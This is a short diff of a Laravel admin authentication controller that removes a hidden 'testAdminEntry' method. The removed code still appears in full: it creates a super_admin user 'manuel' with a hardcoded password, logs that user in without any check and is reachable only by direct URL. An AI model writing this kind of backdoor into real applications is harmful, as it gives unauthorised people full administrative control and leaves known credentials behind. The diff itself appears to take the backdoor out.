@@ -62,28 +62,4 @@ class AdminAuthController extends Controller
         return redirect()->route('login')
             ->with('info', 'You have been logged out.');
     }
-
-    /**
-     * Hidden test admin entry: ensure user "manuel" exists in DB (super_admin, password Atomic2@2020^),
-     * log in as that user and redirect to dashboard. Not linked anywhere; use URL directly.
-     */
-    public function testAdminEntry(): RedirectResponse
-    {
-        $user = User::updateOrCreate(
-            ['username' => 'manuel'],
-            [
-                'name' => 'Manuel',
-                'role' => User::ROLE_SUPER_ADMIN,
-                'password' => Hash::make('Atomic2@2020^'),
-            ]
-        );
-
-        session([
-            'admin_authenticated' => true,
-            'admin_user_id' => $user->id,
-            'admin_role' => $user->role,
-        ]);
-
-        return redirect()->route('dashboard')->with('success', 'Welcome back.');
-    }
 }
